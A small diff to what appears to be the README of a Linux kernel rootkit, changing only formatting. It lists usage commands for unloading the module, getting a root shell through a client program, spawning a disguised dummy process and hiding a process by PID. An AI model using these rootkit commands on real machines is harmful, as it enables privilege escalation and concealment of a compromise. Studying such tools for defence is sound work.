@@ -31,14 +31,12 @@
     > sudo  rmmod rootkit.ko
     
 - interact with client.c
-    -gain root priviges
+    - gain root priviges
     > ./client --root-shell
     
-    -create dummy process
+    - create dummy process
     > perl -MPOSIX -e '$0="sadhadxk"; pause' &
     
     - hide proccess with certain id
     > ./client --hide-pid=PID
     
-    
-    > ./client --hide-pid=PID
